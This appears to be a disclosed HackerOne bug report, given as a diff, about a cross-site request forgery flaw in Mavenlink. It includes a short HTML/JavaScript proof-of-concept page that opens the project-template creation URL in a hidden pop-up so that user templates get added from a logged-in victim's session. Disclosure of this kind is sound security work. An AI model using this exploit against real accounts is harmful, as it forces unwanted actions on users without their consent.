@@ -1,0 +1,34 @@
+ReportLink:https://hackerone.com/reports/301919
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/tolo7010
+ReportedTo:Mavenlink(mavenlink)
+BountyAmount:150.0
+Severity:medium
+State:Closed
+DateOfDisclosure:27.02.2019 23:39:23
+
+Summary:
+
+Reproduction:
+==========
+
+- Log in to account
+- Visit CSRF page below (note default 30 seconds timeout, can be adjusted according to the connection speed): 
+
+```
+<!doctype html>
+<html>
+<head>
+</head> 
+<body>
+<script>
+var a = window.open("https://app.mavenlink.com/project_templates#new", "csrf", "height=100,width=100"); 
+var intervalID = setTimeout(function () { a.close();}, 30000); 
+</script>
+</body>
+</html>
+```
+
+## Impact
+
+CSRF Add user templates
